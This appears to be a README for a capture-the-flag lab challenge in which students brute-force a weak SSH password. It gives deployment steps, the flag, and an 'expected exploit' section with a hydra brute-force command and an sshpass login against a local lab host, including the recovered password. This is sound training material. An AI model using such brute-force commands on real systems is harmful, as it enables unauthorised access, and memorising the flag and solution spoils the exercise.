# ssh-weak-password — SSH Brute-Force Attack

**Vulnerability:** Weak SSH credentials guessable by dictionary attack  
**Tool:** `hydra`  
**Flag:** `WMG{ssh_w3ak_p4ssw0rds_are_never_ok}`

## Scenario

A sysadmin set a weak password on a new `student` account at NovaTech Corp.
SSH is exposed on port 22. A maritime-themed wordlist is provided.
Students use hydra to brute-force the password, then SSH in to retrieve the flag.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/ssh-weak-password/setup.yml
```

First run: `ok=7 changed=4`  
Second run: `ok=7 changed=0` (idempotent)

## Verify

```bash
./agent-harness/verify.sh ssh-weak-password
```

## Expected exploit

```bash
hydra -l student -P games/ssh-weak-password/files/wordlist.txt \
  ssh://127.0.0.1 -s 2222
# → [22][ssh] login: student   password: password123

sshpass -p password123 ssh -p 2222 student@127.0.0.1 'cat ~/flag.txt'
# → WMG{ssh_w3ak_p4ssw0rds_are_never_ok}
```

## Training

`training.json` — 9 levels: reconnaissance → service discovery → brute-force → flag retrieval → ASSESSMENT.  
MITRE ATT&CK: T1110.001 (Brute Force: Password Guessing).  
Student-facing materials: see `briefing.md`, `hints.md`, `solution.md`.
